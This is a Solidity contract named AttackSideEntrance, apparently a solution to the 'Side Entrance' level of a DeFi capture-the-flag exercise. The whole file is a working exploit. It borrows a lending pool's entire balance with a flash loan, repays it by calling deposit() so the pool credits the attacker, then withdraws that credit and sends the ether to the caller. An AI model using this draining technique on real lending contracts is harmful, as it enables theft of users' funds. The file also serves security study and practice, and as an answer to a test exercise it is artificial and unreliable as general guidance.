// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool pool;

    constructor(address pool_) {
        pool = SideEntranceLenderPool(pool_);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() public payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
